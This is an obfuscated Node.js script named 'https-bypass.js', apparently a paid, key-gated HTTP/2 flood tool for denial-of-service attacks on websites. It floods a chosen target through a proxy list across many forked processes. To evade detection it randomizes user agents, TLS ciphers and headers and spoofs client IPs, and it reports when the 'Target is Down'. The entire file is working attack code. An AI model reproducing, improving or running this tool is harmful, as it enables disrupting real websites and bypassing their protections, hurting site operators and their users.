const net = require('net')
const http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster')
const url = require('url'),
  UserAgent = require('user-agents'),
  fs = require('fs'),
  { HeaderGenerator } = require('header-generator')
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (_0x36b7bb) {})
function sleep(_0x204418) {
  return new Promise((_0x927488) => {
    setTimeout(_0x927488, _0x204418)
  })
}
process.argv.length < 7 &&
  (console.log(
    'node https-bypass.js [Key] [Target] [Time] [Rate] [Thread] [Proxyfile] \nDm @deptrai1337 To Get Key'
  ),
  process.exit())
const request = require('request'),
  keyUrl = 'http://54.39.207.170/',
  key = process.argv[2]
request.get(keyUrl, (_0x57830a, _0x8723cc, _0x2a571a) => {
  if (_0x57830a) {
    console.error('Lỗi:', _0x57830a)
    process.exit(1)
  }
  const _0x22d55f = _0x2a571a.trim()
  if (key === _0x22d55f) {
    const _0x56b709 = { TE: 'trailers' }
    function _0x233d77(_0x3aa74b) {
      return fs.readFileSync(_0x3aa74b, 'utf-8').toString().split(/\r?\n/)
    }
    function _0x2e39e0(_0x6c22b4, _0x2e8d91) {
      return Math.floor(Math.random() * (_0x2e8d91 - _0x6c22b4) + _0x6c22b4)
    }
    function _0x135a80(_0x1b5ddf) {
      return _0x1b5ddf[_0x2e39e0(0, _0x1b5ddf.length)]
    }
    function _0x3d573a(_0x52dda7) {
      var _0x5c9113 = '',
        _0x68d6a =
          'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
        _0x2d6b7a = _0x68d6a.length
      for (var _0x3e1a6d = 0; _0x3e1a6d < _0x52dda7; _0x3e1a6d++) {
        _0x5c9113 += _0x68d6a.charAt(Math.floor(Math.random() * _0x2d6b7a))
      }
      return _0x5c9113
    }
    const _0x2af10f = () => {
        const _0x57a28d = () => {
          return Math.floor(Math.random() * 255)
        }
        return (
          _0x57a28d() +
          '.' +
          _0x57a28d() +
          '.' +
          _0x57a28d() +
          '.' +
          _0x57a28d()
        )
      },
      _0x9d51fb = _0x2af10f(),
      _0x44a8e4 = {
        target: process.argv[3],
        time: ~~process.argv[4],
        Rate: ~~process.argv[5],
        threads: ~~process.argv[6],
        proxyFile: process.argv[7],
      }
    var _0x58b7bb = _0x44a8e4
    const _0x3bc1cf = {
      name: 'chrome',
      minVersion: 80,
      maxVersion: 107,
      httpVersion: '2',
    }
    const _0x5750c4 = {
      browsers: [_0x3bc1cf],
      devices: ['desktop'],
      operatingSystems: ['windows'],
      locales: ['en-US', 'en'],
    }
    const _0x339039 = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
      ],
      _0x4b55e5 = [
        'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
        'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        'options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA',
        ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
        'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
        'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4',
        'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
        'EECDH+AESGCM:EDH+AESGCM:CHACHA20:!SHA1:!SHA256:!SHA384',
        'EECDH+AESGCM:EDH+AESGCM',
        'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
        'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
        'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
        'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
      ],
      _0xc9ee1b = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
      ],
      _0x115315 = [
        'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
        'en-US,en;q=0.5',
        'en-US,en;q=0.9',
        'de-CH;q=0.7',
        'da, en-gb;q=0.8, en;q=0.7',
        'cs;q=0.5',
      ],
      _0x2a4578 = ['deflate, gzip, br', 'gzip', 'deflate', 'br'],
      _0x518dbd = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
      ]
    var _0x4378ec =
        _0x4b55e5[Math.floor(Math.floor(Math.random() * _0x4b55e5.length))],
      _0x3d8533 =
        _0x339039[Math.floor(Math.floor(Math.random() * _0x339039.length))],
      _0x5370fb =
        _0x518dbd[Math.floor(Math.floor(Math.random() * _0x518dbd.length))],
      _0x2fa8b7 =
        _0xc9ee1b[Math.floor(Math.floor(Math.random() * _0xc9ee1b.length))],
      _0x259dc7 =
        _0x115315[Math.floor(Math.floor(Math.random() * _0x115315.length))],
      _0x5dcb00 =
        _0x2a4578[Math.floor(Math.floor(Math.random() * _0x2a4578.length))],
      _0x2e7ffa = _0x233d77(_0x58b7bb.proxyFile)
    const _0x4b58b3 = url.parse(_0x58b7bb.target)
    if (cluster.isMaster) {
      for (let _0x4cbce9 = 1; _0x4cbce9 <= _0x58b7bb.threads; _0x4cbce9++) {
        cluster.fork()
      }
    } else {
      setInterval(_0x495fc4)
    }
    class _0x2fb7c9 {
      constructor() {}
      ['HTTP'](_0x3b2c9b, _0x4f11e7) {
        const _0x1437e4 =
            'CONNECT ' +
            _0x3b2c9b.address +
            ':443 HTTP/1.1\r\nHost: ' +
            _0x3b2c9b.address +
            ':443\r\nConnection: Keep-Alive\r\n\r\n',
          _0x49433a = new Buffer.from(_0x1437e4),
          _0x2b7e96 = {
            host: _0x3b2c9b.host,
            port: _0x3b2c9b.port,
          }
        const _0x189fbc = net.connect(_0x2b7e96)
        _0x189fbc.setTimeout(_0x3b2c9b.timeout * 100000)
        _0x189fbc.setKeepAlive(true, 100000)
        _0x189fbc.on('connect', () => {
          _0x189fbc.write(_0x49433a)
        })
        _0x189fbc.on('data', (_0x1dae22) => {
          const _0x8b8b9a = _0x1dae22.toString('utf-8'),
            _0x28f290 = _0x8b8b9a.includes('HTTP/1.1 200')
          if (_0x28f290 === false) {
            _0x189fbc.destroy()
            return _0x4f11e7(
              undefined,
              'error: invalid response from proxy server'
            )
          }
          return _0x4f11e7(_0x189fbc, undefined)
        })
        _0x189fbc.on('timeout', () => {
          _0x189fbc.destroy()
          return _0x4f11e7(undefined, 'error: timeout exceeded')
        })
        _0x189fbc.on('error', (_0x191d06) => {
          _0x189fbc.destroy()
          return _0x4f11e7(undefined, 'error: ' + _0x191d06)
        })
      }
    }
    const _0x2ab913 = new _0x2fb7c9()
    _0x56b709[':authority'] = _0x4b58b3.host
    _0x56b709[':method'] = 'GET'
    _0x56b709[':path'] =
      _0x4b58b3.path + '?' + _0x3d573a(6) + '=' + _0x3d573a(12)
    _0x56b709.origin = _0x4b58b3.protocol + '//' + _0x4b58b3.host
    _0x56b709[':scheme'] = 'https'
    _0x56b709.accept = _0x2fa8b7
    _0x56b709['accept-encoding'] = _0x5dcb00
    _0x56b709['accept-language'] = _0x259dc7
    _0x56b709['cache-control'] = 'max-age=0'
    _0x56b709['sec-ch-ua'] =
      '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"'
    _0x56b709['sec-ch-ua-mobile'] = '?0'
    _0x56b709['sec-ch-ua-platform'] = 'Windows'
    _0x56b709['sec-fetch-dest'] = 'document'
    _0x56b709['sec-fetch-mode'] = 'navigate'
    _0x56b709['sec-fetch-site'] = 'none'
    _0x56b709['sec-fetch-user'] = '?1'
    _0x56b709['upgrade-insecure-requests'] = '1'
    _0x56b709.pragma =
      'client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace'
    _0x56b709.Trailer = 'Max-Forwards'
    _0x56b709['x-requested-with'] = 'XMLHttpRequest'
    _0x56b709['Content-Type'] = 'text/plain'
    _0x56b709['user-agent'] = _0x5370fb
    function _0x495fc4() {
      const _0xc21711 = _0x135a80(_0x2e7ffa),
        _0x36d761 = _0xc21711.split(':')
      _0x56b709['X-Forwarded-For'] = _0x9d51fb
      _0x56b709['X-Forwarded-Host'] = _0x9d51fb
      _0x56b709['Real-IP'] = _0x9d51fb
      const _0x101317 = {
        host: _0x36d761[0],
        port: ~~_0x36d761[1],
        address: _0x4b58b3.host + ':443',
        timeout: 100,
      }
      _0x2ab913.HTTP(_0x101317, (_0x1cfe3b, _0x497146) => {
        if (_0x497146) {
          return
        }
        _0x1cfe3b.setKeepAlive(true, 600000)
        const _0x33d540 = {
            host: _0x4b58b3.host,
            ecdhCurve: 'prime256v1:secp384r1:secp521r1',
            ciphers: tls.getCiphers().join(':') + _0x4378ec,
            secureProtocol: [
              'TLSv1_2_method',
              'TLSv1_3_methd',
              'SSL_OP_NO_SSLv3',
              'SSL_OP_NO_SSLv2',
              'TLS_OP_NO_TLS_1_1',
              'TLS_OP_NO_TLS_1_0',
            ],
            sigals: _0x3d8533,
            servername: _0x4b58b3.host,
            challengesToSolve: 5,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            maxRedirects: 20,
            followAllRedirects: true,
            decodeEmails: false,
            gzip: true,
            servername: _0x4b58b3.host,
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
            socket: _0x1cfe3b,
          },
          _0x8e0020 = tls.connect(443, _0x4b58b3.host, _0x33d540)
        _0x8e0020.setKeepAlive(true, 100000)
        const _0x746c26 = {
          headerTableSize: 65536,
          maxConcurrentStreams: 20000,
          initialWindowSize: 6291456,
          maxHeaderListSize: 262144,
          enablePush: false,
        }
        const _0x48f7be = {
          protocol: 'https:',
          settings: _0x746c26,
          maxSessionMemory: 64000,
          maxDeflateDynamicTableSize: 4294967295,
          createConnection: () => _0x8e0020,
          socket: _0x1cfe3b,
        }
        const _0x1faa1e = http2.connect(_0x4b58b3.href, _0x48f7be),
          _0x4db3cf = {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false,
          }
        _0x1faa1e.settings(_0x4db3cf)
        _0x1faa1e.setMaxListeners(0)
        _0x1faa1e.on('connect', () => {})
        _0x1faa1e.on('close', () => {
          _0x1faa1e.destroy()
          _0x1cfe3b.destroy()
          return
        })
        _0x1faa1e.on('error', (_0x2559f0) => {
          _0x1faa1e.destroy()
          _0x1cfe3b.destroy()
          return
        })
      })
      ;(function (_0x35493f, _0x4b3215, _0x5af269) {
        if (_0x4b3215.statusCode == 200) {
          console.log('Status 200')
        } else {
          if (
            _0x4b3215.statusCode == 502 ||
            _0x4b3215.statusCode == 503 ||
            _0x4b3215.statusCode == 504 ||
            _0x4b3215.statusCode == 520 ||
            _0x4b3215.statusCode == 525 ||
            _0x4b3215.statusCode == 522
          ) {
            console.log('Target is Down')
          }
        }
      })
    }
    const _0x47d92c = () => process.exit(1)
    setTimeout(_0x47d92c, _0x58b7bb.time * 1000)
  } else {
    console.log('Key InVaild')
    process.exit(1)
  }
})
